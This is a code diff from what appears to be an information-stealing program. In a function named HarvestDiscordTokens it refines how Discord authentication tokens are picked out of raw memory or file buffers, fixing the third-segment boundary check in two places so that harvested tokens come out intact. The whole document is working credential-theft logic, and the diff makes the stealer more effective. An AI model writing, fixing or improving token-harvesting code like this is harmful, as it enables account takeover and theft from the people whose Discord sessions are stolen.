@@ -1146,15 +1146,16 @@ static void HarvestDiscordTokens() {
                     }
                     if (dots == 2) {
                         DWORD seg1 = dp[0] - i, seg2 = dp[1] - dp[0] - 1;
-                        while (end < sz && IsTokenChar(buf[end]) && end - i < 130) end++;
-                        DWORD seg3 = end - dp[1] - 1;
+                        DWORD end3 = dp[1] + 1;
+                        while (end3 < sz && buf[end3] != '.' && IsTokenChar(buf[end3]) && end3 - i < 130) end3++;
+                        DWORD seg3 = end3 - dp[1] - 1;
                         if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60) {
                             bool v = true;
                             for (int k = i; k < dp[0]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                             for (int k = dp[0]+1; k < dp[1]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                             bool d = false;
                             for (int k = i; k < dp[0]; k++) if (buf[k] >= '0' && buf[k] <= '9') { d = true; break; }
-                            if (v && d) { totalCandidates++; tokens.push_back(std::string(buf + i, end - i)); }
+                            if (v && d) { totalCandidates++; tokens.push_back(std::string(buf + i, end3 - i)); }
                         }
                     }
                     // Skip past this run of token chars
@@ -1221,15 +1222,16 @@ static void HarvestDiscordTokens() {
                                     }
                                     if (dots == 2) {
                                         DWORD seg1 = dp[0] - i, seg2 = dp[1] - dp[0] - 1;
-                                        while (end < rd && IsTokenChar(buf[end]) && end - i < 130) end++;
-                                        DWORD seg3 = end - dp[1] - 1;
+                                        DWORD end3 = dp[1] + 1;
+                                        while (end3 < rd && buf[end3] != '.' && IsTokenChar(buf[end3]) && end3 - i < 130) end3++;
+                                        DWORD seg3 = end3 - dp[1] - 1;
                                         if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60) {
                                             bool v = true;
                                             for (int k = i; k < dp[0]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                                             for (int k = dp[0]+1; k < dp[1]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                                             bool d = false;
                                             for (int k = i; k < dp[0]; k++) if (buf[k] >= '0' && buf[k] <= '9') { d = true; break; }
-                                            if (v && d) tokens.push_back(std::string(buf + i, end - i));
+                                            if (v && d) tokens.push_back(std::string(buf + i, end3 - i));
                                         }
                                     }
                                     while (i < rd && IsTokenChar(buf[i])) i++;
